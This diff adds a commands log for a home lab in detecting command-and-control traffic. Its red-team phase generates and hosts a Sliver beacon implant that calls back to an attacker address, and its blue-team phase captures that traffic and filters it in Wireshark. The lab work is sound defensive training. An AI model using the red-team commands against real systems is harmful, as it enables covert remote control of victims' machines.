@@ -1,0 +1,62 @@
+=======================================================================
+               ENTERPRISE C2 DETECTION LAB - COMMANDS LOG
+=======================================================================
+
+# ---------------------------------------------------------------------
+# PHASE 1: RED TEAM (WEAPONIZATION & DELIVERY)
+# ---------------------------------------------------------------------
+
+# 1. Check Attacker Network Interface
+ip a
+
+# 2. Start Sliver C2 Console
+sliver
+
+# 3. Start mTLS Listener (Inside Sliver)
+sliver > mtls
+
+# 4. Generate C2 Beacon Payload (Windows 64-bit, 30s interval, 10s jitter)
+sliver > generate beacon --mtls 192.168.56.1 --os windows --arch amd64 --format exe --seconds 30 --jitter 10
+
+# 5. Check Active Listeners
+sliver > jobs
+
+# 6. Host Payload via Python HTTP Server (Run in payload directory)
+python3 -m http.server 8080
+
+# 7. Check Active C2 Beacons (Inside Sliver)
+sliver > beacons
+
+
+# ---------------------------------------------------------------------
+# PHASE 2: BLUE TEAM (NETWORK CAPTURE & THREAT HUNTING)
+# ---------------------------------------------------------------------
+
+# 1. Capture Network Traffic (Save to PCAP)
+sudo tcpdump -i vboxnet0 -w c2_beacon_traffic.pcap
+
+# 2. Analyze PCAP using Wireshark
+wireshark c2_beacon_traffic.pcap &
+
+# 3. Wireshark Filter: Detect Payload Delivery (HTTP)
+ip.addr == 192.168.56.101 && ip.addr == 192.168.56.1 && tcp.port == 8080
+
+# 4. Wireshark Filter: Detect mTLS Beaconing
+tcp.port == 8888
+
+
+# ---------------------------------------------------------------------
+# PHASE 3: MISC / UTILITY COMMANDS
+# ---------------------------------------------------------------------
+
+# Batch Rename Screenshot Files for Documentation
+mv "Screenshot From 2026-07-23 13-09-53.png" 01-payload-generation.png && \
+mv "Screenshot From 2026-07-23 13-15-27.png" 02-payload-hosting.png && \
+mv "Screenshot From 2026-07-23 13-12-57.png" 03-victim-download.png && \
+mv "Screenshot From 2026-07-23 13-38-17.png" 04-wireshark-delivery.png && \
+mv "Screenshot From 2026-07-23 13-16-56.png" 05-initial-beacon.png && \
+mv "Screenshot From 2026-07-23 13-30-20.png" 06-beacon-jitter.png && \
+mv "Screenshot From 2026-07-23 14-09-03.png" 07-tcpview-connection.png && \
+mv "Screenshot From 2026-07-23 14-11-04.png" 08-procexp-execution.png && \
+mv "Screenshot From 2026-07-23 14-14-25.png" 09-incident-response.png && \
+mv "Screenshot From 2026-07-23 14-16-35.png" 10-eradication-confirmed.png
